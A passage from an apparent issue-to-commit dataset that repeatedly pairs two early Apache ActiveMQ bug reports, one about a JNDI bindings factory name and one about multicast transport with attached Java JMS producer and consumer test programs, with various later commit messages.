	FOO/FactoryName=com.spirit.core.util.resolver.JNDIResolver
	FOO/ClassName=org.codehaus.activemq.message.ActiveMQTopic
	FOO/RefAddr/0/Type=physicalName


Is it intentional that the FactoryName is set to com.spirit.core.util.resolver.JNDIResolver?
Isn't spirit soft commercial software?

Looking into the code, it seems to be coming from org.codehaus.activemq.jndi.JNDIReferenceFactory.createReference().


Well, hope to hear from you soon about this. 


Many thanks in advance.",78a54c93533dfce355686ece14ddbfd73e230845,"apply patch from https://issues.apache.org/jira/browse/AMQ-3067 with thanks and additional test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1041351 13f79535-47bb-0310-9956-ffa450edef68"
12481274,AMQ-30,"I was trying to learn how to use ActiveMQ.  

I try using Sun's Filesystem JNDI provider instead of using say RMI registry or some other JNDI provider that comes with app servers.

The problem I am having is, when I bind an ActiveMQTopic to Sun's filesystem provider, what I looked-up from the other JVM is a javax.naming.Reference object instead of what I was expecting i.e. ActiveMQTopic objects.

Looking into the .bindings used by the filesystem JNDI reveals what I think is the explaination:

	#This file is used by the JNDI FSContext.
	#Thu Jun 03 14:05:58 PDT 2004
	FOO/RefAddr/0/Encoding=String
	FOO/RefAddr/0/Content=FOO
	FOO/FactoryName=com.spirit.core.util.resolver.JNDIResolver
	FOO/ClassName=org.codehaus.activemq.message.ActiveMQTopic
	FOO/RefAddr/0/Type=physicalName


Is it intentional that the FactoryName is set to com.spirit.core.util.resolver.JNDIResolver?
Isn't spirit soft commercial software?

Looking into the code, it seems to be coming from org.codehaus.activemq.jndi.JNDIReferenceFactory.createReference().


Well, hope to hear from you soon about this. 


Many thanks in advance.",d0a1a001a3bee563e8cf06b4d2b82fc8373617d6,"https://issues.apache.org/jira/browse/AMQ-3088 - scheduled page error when scheduler is off

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1053683 13f79535-47bb-0310-9956-ffa450edef68"
12481274,AMQ-30,"I was trying to learn how to use ActiveMQ.  

I try using Sun's Filesystem JNDI provider instead of using say RMI registry or some other JNDI provider that comes with app servers.

The problem I am having is, when I bind an ActiveMQTopic to Sun's filesystem provider, what I looked-up from the other JVM is a javax.naming.Reference object instead of what I was expecting i.e. ActiveMQTopic objects.

Looking into the .bindings used by the filesystem JNDI reveals what I think is the explaination:

	#This file is used by the JNDI FSContext.
	#Thu Jun 03 14:05:58 PDT 2004
	FOO/RefAddr/0/Encoding=String
	FOO/RefAddr/0/Content=FOO
	FOO/FactoryName=com.spirit.core.util.resolver.JNDIResolver
	FOO/ClassName=org.codehaus.activemq.message.ActiveMQTopic
	FOO/RefAddr/0/Type=physicalName


Is it intentional that the FactoryName is set to com.spirit.core.util.resolver.JNDIResolver?
Isn't spirit soft commercial software?

Looking into the code, it seems to be coming from org.codehaus.activemq.jndi.JNDIReferenceFactory.createReference().


Well, hope to hear from you soon about this. 


Many thanks in advance.",e511e76d4fef5e91fc73f8063bff04844ad4be19,"https://issues.apache.org/jira/browse/AMQ-3041 - unregister mbean for temp dest

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1061296 13f79535-47bb-0310-9956-ffa450edef68"
12481274,AMQ-30,"I was trying to learn how to use ActiveMQ.  

I try using Sun's Filesystem JNDI provider instead of using say RMI registry or some other JNDI provider that comes with app servers.

The problem I am having is, when I bind an ActiveMQTopic to Sun's filesystem provider, what I looked-up from the other JVM is a javax.naming.Reference object instead of what I was expecting i.e. ActiveMQTopic objects.

Looking into the .bindings used by the filesystem JNDI reveals what I think is the explaination:

	#This file is used by the JNDI FSContext.
	#Thu Jun 03 14:05:58 PDT 2004
	FOO/RefAddr/0/Encoding=String
	FOO/RefAddr/0/Content=FOO
	FOO/FactoryName=com.spirit.core.util.resolver.JNDIResolver
	FOO/ClassName=org.codehaus.activemq.message.ActiveMQTopic
	FOO/RefAddr/0/Type=physicalName


Is it intentional that the FactoryName is set to com.spirit.core.util.resolver.JNDIResolver?
Isn't spirit soft commercial software?

Looking into the code, it seems to be coming from org.codehaus.activemq.jndi.JNDIReferenceFactory.createReference().


Well, hope to hear from you soon about this. 


Many thanks in advance.",4e33fb114bba828af335be3bcf849116dd8587f2,"https://issues.apache.org/jira/browse/AMQ-3038 - delete temp destinations when connection is closed

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1061365 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",c2b1d72be92bda4814bb3513f68a255360f61eb6,"https://issues.apache.org/activemq/browse/AMQ-2907 - solaris 10 smf

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@995699 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",6672740da0a4c9c5d6b084614f390e5d0539ada4,"fix for: https://issues.apache.org/activemq/browse/AMQ-2915

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@996646 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",acb8164bc619ebcc2007b7094d5d926b1dafc197,"https://issues.apache.org/activemq/browse/AMQ-2927 - test case in the making

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@999814 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",06d6e08f48d735f2772ef8703f39da1852a336ab,"https://issues.apache.org/activemq/browse/AMQ-2954 - test scheduling after restart

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1004640 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",1e900b300a62d2cfbdebfce4ef8235fb31576622,"a little more debug info on file gc, https://issues.apache.org/activemq/browse/AMQ-2955

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1021747 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
